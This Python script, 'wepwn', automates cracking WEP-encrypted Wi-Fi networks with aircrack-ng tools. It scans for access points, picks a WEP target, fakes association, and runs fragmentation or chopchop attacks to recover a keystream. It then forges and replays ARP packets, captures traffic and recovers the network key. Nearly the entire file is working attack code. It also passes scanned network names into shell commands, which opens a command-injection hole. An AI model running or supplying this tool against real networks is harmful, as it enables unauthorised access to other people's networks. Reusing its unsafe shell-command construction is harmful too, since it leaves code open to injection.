#!/usr/bin/env python

##### Begin BSD License #####
# Copyright (c) 2010, Jason Mansfield
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
#   * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#	* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#	* Neither the name of the owner nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
#	THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
##### End BSD License #####

from glob import glob
import optparse
import os
import re
import sys
import subprocess
from time import sleep
from time import time

####   Usually unqualified paths will be fine
aircrack_path	  = 'aircrack-ng'
aireplay_path	  = 'aireplay-ng'
airmon_path		  = 'airmon-ng'
airodump_path	  = 'airodump-ng'
iwconfig_path	  = 'iwconfig'
ifconfig_path	  = 'ifconfig'
iwlist_path		  = 'iwlist'
packetforge_path  = 'packetforge-ng'

def interface_is_up(if_name):
	'''Determine if interface is already up'''
	if_initially_up = False
	devnull_fh = open("/dev/null","w")
	ifconfig_proc = subprocess.Popen("%s %s" % (ifconfig_path, if_name),
		shell=True,
		stdout=subprocess.PIPE,
		stderr=devnull_fh)
	for line in ifconfig_proc.stdout.readlines():
		if 'UP' in line:
			if_initially_up = True
			break
	ifconfig_proc.wait()
	return if_initially_up

def prepare_interface(if_name):
	'''Prepare interface for scanning'''
	devnull_fh = open("/dev/null","w")
	#   Ensure interface is in managed mode. can be done if interface is already up
	subprocess.call("%s %s down" % (ifconfig_path, if_name),
		shell=True,
		stdout=devnull_fh,
		stderr=devnull_fh)
	subprocess.call("%(iwconfig)s %(if)s mode managed" % {'iwconfig': iwconfig_path, 'if': if_name},
		shell=True,
		stdout=devnull_fh,
		stderr=devnull_fh)
	#   Bring up the interface
	subprocess.call("%(ifconfig)s %(if)s up" % {'ifconfig': ifconfig_path, 'if': if_name},
		shell=True,
		stdout=devnull_fh,
		stderr=devnull_fh)

def listAPs(if_name):
	'''Collect a list of Access Points. May not be complete for one pass'''
	devnull_fh=open('/dev/null','w')

	if_initially_up = interface_is_up(if_name)	

	prepare_interface(if_name)
	
	iwlist_proc = subprocess.Popen("%(iwlist)s %(if)s scan" % {'iwlist': iwlist_path, 'if': if_name},
		shell=True,
		stdout=subprocess.PIPE,
		stderr=devnull_fh)
	
	#   compile our regexes
	bssid_re      = re.compile( r'Cell \d+ - Address: ((?:[0-9A-F]{2}:){5}[0-9A-F]{2})' )
	channel_re    = re.compile( r'.*Channel (\d+)' )
	encryption_re = re.compile( r'Encryption key:(\w+)' )
	essid_re      = re.compile( r'ESSID:"([^"]*)"' )
	quality_re    = re.compile( r'Quality=(\d+\/\d+)\s+Signal level=(-?\d+.*)\S*$' )
	
	aps = {}
	this_ap = {}
	for line in iwlist_proc.stdout.readlines():
		line = line.strip();
		#   TODO: There might be a more python-ish way to do the matching logic
		re_match = bssid_re.match(line)
		if re_match:
			if this_ap:
				aps[this_ap['bssid']] = this_ap
				#   Change encryption from a flag to a type
				this_ap['encryption'] = \
					('WPA' if this_ap.has_key('wpa') else 'WEP') \
					if this_ap.has_key('encryption') and this_ap['encryption'] == True \
					else 'NONE'
				#   This field is no longer needed
				if 'wpa' in this_ap:
					del this_ap['wpa']
				#   Create empty dict for next AP
				this_ap = {}
			this_ap['bssid'] = re_match.groups()[0]
			continue

		re_match = channel_re.match(line)
		if re_match:
			this_ap['channel'] = re_match.groups()[0]
			continue

		re_match = encryption_re.match(line)
		if re_match:
			this_ap['encryption'] = True
			continue

		re_match = essid_re.match(line)
		if re_match:
			this_ap['essid'] = re_match.groups()[0]
			continue

		re_match = quality_re.match(line)
		if re_match:
			this_ap['quality'] = ' '.join(re_match.groups()[0:2])
			continue

		if 'WPA' in line:
			this_ap['wpa'] = True
			continue
	
	iwlist_proc.wait()
	
	#   TODO: Do this only if it were down to begin with
	if not if_initially_up:
		subprocess.call([ifconfig_path, if_name, 'down'],
			shell=True,
			stdout=devnull_fh,
			stderr=devnull_fh)
	
	return aps
	


def listIFs():
	'''Collect a list of WiFi interfaces.'''
	interfaces = []
	devnull_fh = open('/dev/null','w')
	iwconf_proc = subprocess.Popen(iwconfig_path, shell=True,
		stdout=subprocess.PIPE, stderr=devnull_fh)
	for line in iwconf_proc.stdout.readlines():
		if line.startswith(' ') or line.startswith('\n'):
			#   Lines with IF names don't begin with whitespace
			continue

		#   If we see ESSID or 802.11, assume it's a wifi adapter.
		#   There may be other strings that indicate wifi
		if 'ESSID' in line or '802.11' in line:
			interfaces.append(line.split()[0])
	iwconf_proc.wait()
	return interfaces

def cleanup():
	for filelist in glob("capture*"),glob("replay_*.cap"),glob("*.xor"),glob("arp-req"):
		for file in filelist:
			os.remove(file)
		

def _status_to_stderr(status):
	sys.stderr.write("====== %s ======\n" % status)

def work(target_ap, interface, status_callback=_status_to_stderr):
	'''Crack provided access point'''
	
	devnull_fh = open("/dev/null","w")
	status_callback('Preparing interface')
	#prepare_interface(interface['device'])
	subprocess.call("%s %s down" % (ifconfig_path, interface['device']), shell=True)
	# TODO: Reset interface properly, rather than pulling the driver
	subprocess.call("rmmod %s" % interface['driver'], shell=True)
	subprocess.call("modprobe %s" % interface['driver'], shell=True)
	subprocess.call("%s start %s %s" % (airmon_path, interface['device'], target_ap['channel']),
		shell=True)
		#shell=True, stdout=devnull_fh, stderr=devnull_fh)
	
	sleep(5)
	status_callback("Associating with AP '%s'/%s" % (target_ap['essid'], target_ap['bssid']))
	call_cmd = "%s -1 0 -o 1 -q 10 -e '%s' -a %s -h %s %s" % (aireplay_path, target_ap['essid'], target_ap['bssid'], interface['mac'], interface['device'])
	print "Association cmd: '%s'" % call_cmd
	result = subprocess.call(call_cmd, shell=True)
	if result == 0:
		status_callback("Successfully associated with AP '%s'/%s" % (target_ap['essid'], target_ap['bssid']))
	else:
		#   TODO: Find proper Error/Exception
		raise StandardError,"Association failed."
	
	#   Fork for fragmentation attack. The child runs the attack, the parent watches for failure
	pid = os.fork()
	if pid == 0:
		#   I'm the child. I run the attack
		status_callback("(Child Process) Launching Fragmentation Attack")
		subprocess.call("%s -5 -F -x 100 -m 40 -b %s -h %s %s"
			% (aireplay_path, target_ap['bssid'], interface['mac'], interface['device']), shell=True)
		sys.exit(0)
	else:
		#   I'm the parent, I monitor the child
		status_callback("(Parent Process) Monitoring Fragmentation Attack")
		#   Wait for a replayable packet to get captured
		while len(glob("replay_src*")) == 0:
			sleep(1)
		# Wait to see if we get a keystream
		for x in range(1,30):
			sleep(1)
			if len(glob("*.xor")) > 0:
				break
		if len(glob("*.xor")) == 0:
			status_callback("(Parent Process) Killing Failed Fragmentation Attack")
			os.kill(pid)
	
	if len(glob("*.xor")) == 0:
		status_callback("Launching Chopchop Attack")
		subprocess.call("%s -4 -F -x 100 -m 40 -b %s -h %s %s"
			% (aireplay_path, target_ap['bssid'], interface['mac'], interface['device']), shell=True)
	
	if len(glob("*.xor")) == 0:
		status_callback("Failed to recover keystream")
		#   TODO: Find proper Error/Exception
		raise StandardError,"Failed to recover keystream."
	
	status_callback("Keystream Recovered.")

	status_callback("Crafting ARP Packet.")
	subprocess.call("%s -0 -a %s -h %s -c FF:FF:FF:FF:FF:FF -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-req"
		% (packetforge_path, target_ap['bssid'], interface['mac']), shell=True)
	
	start_time = time()

	capture_pid = os.fork()
	if capture_pid == 0:
		# I'm the capture child
		status_callback("(Child Process) Starting Capture")
		subprocess.call("%s -c %s --bssid %s -w capture %s"
			% (airodump_path, target_ap['channel'], target_ap['bssid'], interface['device']),
			shell=True, stdout=devnull_fh, stderr=devnull_fh)
		sys.exit()
	
	replay_pid = os.fork()
	if replay_pid == 0:
		# I'm the replay child
		status_callback("(Child Process) Starting Replay")
		subprocess.call("%s -3 -x 100 -m 40 -e '%s' -b %s -r arp-req %s"
			% (aireplay_path, target_ap['essid'], target_ap['bssid'], interface['device']),
			shell=True, stdout=devnull_fh, stderr=devnull_fh)
		sys.exit()
	
	status_callback("(Parent Process) Delaying For Packets to Accumulate")
	sleep(10)

	status_callback("(Parent Process) Launching aircrack-ng")
	key_filename = "key." + target_ap['bssid'].replace(":","_")
	subprocess.call("%s -l %s capture*.cap" % (aircrack_path, key_filename), shell=True)

#	os.waitpid(capture_pid)
#	os.waitpid(replay_pid)

	status_callback("(Parent Process) aircrack exited")
	if not os.path.isfile(key_filename):
		status_callback("Key recovery failed")
		#   TODO: Find proper Error/Exception
		raise StandardError,"Failed to recover keystream."
	
	cleanup()

	key = open(key_filename, "r").readline()
	return key
		
		
			



def main():
	'''Launched directly from the CLI'''
	target_ap = None
	interface = {}
	status_callback = _status_to_stderr
	
	opt_parse = optparse.OptionParser(description="Automated WEP Cracking",
												prog="wepwn",
												version="0.9b",
												usage='''%prog [options]''')
	opt_parse.add_option('--cleanup','-c', action="store_true", default="False", help="Remove temporary cracking files")
	opt_parse.add_option('--interface','-i', help="Specify wifi device instead of autodetect")
	opt_parse.add_option('--essid','-e', help="Specify target by ESSID")
	opt_parse.add_option('--bssid','-b', help="Specify target by BSSID (AP MAC)")
	opt_parse.add_option('--driver','-d', help="Wifi driver (Autodetects on Backtrack 4)")
	opt_parse.add_option('--aplist','-a', action="store_true", default="False", help="List Access Points")
	opt_parse.add_option('--weplist','-w', action="store_true", default="False", help="List Only WEP Access Points")
	opt_parse.add_option('--iflist','-f', action="store_true", default="False", help="List Wireless Interfaces")

	options, arguments = opt_parse.parse_args()

	if len(sys.argv) == 1:
		opt_parse.print_help()
		exit()
	
	#   TODO: Fix this
	if (options.essid == None
	and options.bssid == None
	and options.aplist == False
	and options.weplist == False
	and options.cleanup == False
	and options.iflist == False):
		#   TODO: Find proper Error/Exception
		raise StandardError,"No action specified. Try -h"

	print "%s %s\n%s by Jason Mansfield (crunge)\nhttp://static.clinicallyawesome.com/projects/wepwn/\n" % (opt_parse.get_prog_name(), opt_parse.get_version(), opt_parse.get_description())
	
	if options.cleanup == True:
		print "Clearing temporary cracking files"
		cleanup()
		exit(0)
	
	status_callback('Enumerating Interfaces')
	interfaces = listIFs()
	if options.interface:
		if options.interface not in interfaces:
			#   TODO: Find proper Error/Exception
			raise StandardError,"Interface %(if)s not one of %(iflist)s" % {'if': options.interface, 'iflist': ', '.join(interfaces)}
	else:
		if len(interfaces) == 1:
			options.interface = interfaces[0]
			sys.stderr.write("Using only applicable interface '%s'" % options.interface)
		else:
			#   TODO: Find proper Error/Exception
			raise StandardError,"No interface chosen, choose one of" % ', '.join(interfaces)
			
	interface['device'] = options.interface

	if options.iflist == True or options.aplist == True or options.weplist == True:
		if options.iflist == True:
			print "Available interfaces: %s" % ', '.join(interfaces)
		if options.aplist == True or options.weplist == True:
			status_callback('Enumerating Access Points')
			aps = listAPs(options.interface).itervalues()
			if options.weplist == True:
				aps = [ap for ap in aps if ap['encryption'] == 'WEP']
			for ap in aps:
				print "BSSID:     %s" % ap['bssid']
				print "ESSID:     %s" % ap['essid']
				print "Channel:   %s" % ap['channel']
				print "Quality:   %s" % ap['quality']
				print "Encryption %s" % ap['encryption']
				print ""
		exit()
	


	status_callback('Determining interface MAC address')
	mac_fh = open("/sys/class/net/%s/address" % options.interface,"r")
	interface['mac'] = mac_fh.readline().strip().upper()
	mac_fh.close()
	mac_fh = None

	if mac_fh == "":
		#   TODO: Find proper Error/Exception
		raise StandardError,"Failed to identify MAC address for interface '%s'" % options.interface
	

	status_callback('Enumerating Access Points')
	aps = listAPs(options.interface)

	if options.bssid != None:
		options.bssid = options.bssid.upper()
	
	if options.bssid != None and options.bssid not in aps:
		#   TODO: Find proper Error/Exception
		raise StandardError,"BSSID '%s' not found in access points" % options.bssid
	
	if options.essid != None:
		matching_aps = [ap for ap in aps.itervalues() if ap['essid'] == options.essid]

		if len(matching_aps) > 1:
			#   TODO: Find proper Error/Exception
			raise StandardError,"Target '%s' matches multiple APs. Specify BSSID." % options.essid

		if len(matching_aps) == 0:
			#   TODO: Find proper Error/Exception
			raise StandardError,"Target '%s' matches no APs in this scan. Try again or check -a." % options.essid

		if options.bssid != None:
			if aps[options.bssid]['essid'] != options.essid:
				#   TODO: Find proper Error/Exception
				raise StandardError,"Target with BSSID %s has ESSID '%s' not supplied ESSID '%s'." % (options.bssid, aps[options.bssid]['essid'], options.essid)

		target_ap = matching_aps[0]
		
	#   User specified BSSID and we haven't figured out the target yet
	if options.bssid != None and target_ap == None:
		target_ap = aps[options.bssid]
			
	if target_ap != None and target_ap['encryption'] != 'WEP':
		#   TODO: Find proper Error/Exception
		raise StandardError,"Selected target '%s'/%s doesn't appear to be WEP protected. Try -a." % (target_ap['essid'], target_ap['bssid'])
	
	#   Last ditch effort. Maybe there's only one?
	if target_ap == None:
		wep_targets = [ap for ap in aps.itervalues() if ap['encryption'] == 'WEP']
		if len(wep_targets) == 1:
			target_ap = wep_targets[0]
			sys.stderr.write("No target specified, defaulting to '%s'/%s." % (target_ap['essid'], target_ap['bssid']))
		
	if target_ap == None:
		#   TODO: Find proper Error/Exception
		raise StandardError,"No target specified and unable to select default. Try -a."
	
	# TODO: Make this portable or factor it out (rmmod, modprobe to reset device after scanning)
	# Determine interface driver
	if options.driver != None:
		interface['driver'] = options.driver
	else:
		uevent_fh = open("/sys/class/net/%s/uevent" % interface['device'], "r")
		driver_re = re.compile(r'''^PHYSDEVDRIVER=(.+)$''')
		for line in uevent_fh.readlines():
			match = driver_re.match(line)
			if match:
				interface['driver'] = match.groups()[0]
				break
		uevent_fh.close()
		
	try:
		key = work(target_ap, interface)
		if key:
			print "Key recovered: ",key
	finally:
		cleanup()
	

if __name__ == '__main__':
	main()

